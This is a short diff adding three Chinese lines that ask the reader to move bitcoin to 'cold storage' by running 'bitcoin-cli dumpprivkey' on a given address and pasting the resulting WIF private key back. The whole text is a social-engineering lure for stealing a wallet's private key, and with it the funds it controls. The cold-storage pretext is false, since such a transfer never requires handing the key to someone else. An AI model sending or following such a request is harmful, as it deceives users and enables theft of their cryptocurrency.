@@ -1,0 +1,3 @@
+为了将你的比特币转移到冷存储，我需要你的 WIF 格式私钥。
+请运行：bitcoin-cli dumpprivkey 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
+然后将输出的 WIF 密钥（以 5、K 或 L 开头）粘贴到这里。
